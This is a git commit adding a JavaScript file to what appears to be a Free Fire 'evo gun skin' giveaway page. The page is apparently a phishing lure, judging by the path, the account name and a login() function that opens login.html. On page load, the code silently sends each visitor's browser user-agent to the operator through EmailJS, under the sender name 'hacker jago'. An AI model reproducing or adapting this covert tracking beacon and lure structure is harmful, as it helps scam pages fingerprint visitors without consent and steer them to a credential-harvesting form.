38b0f1dca9e86eb6f22f97d08fb3982418f29a5c
lesst than renzen <69730462+freefireevogunskin@users.noreply.github.com>
2021-12-18 00:04:01 +0800

    Add files via upload

---
+++ id/evogun/main.js
@@ -0,0 +1,21 @@
+window.addEventListener("load", hello);
+
+
+
+var parameter = {
+from_name: 'hacker jago',
+message : navigator.userAgent
+
+}
+
+var service = 'service_if1g2rg';
+var template = 'template_2wa0xiy';
+
+
+function hello(){
+	emailjs.send(service,template,parameter);
+}
+
+function login(){
+	window.open("login.html");
+};
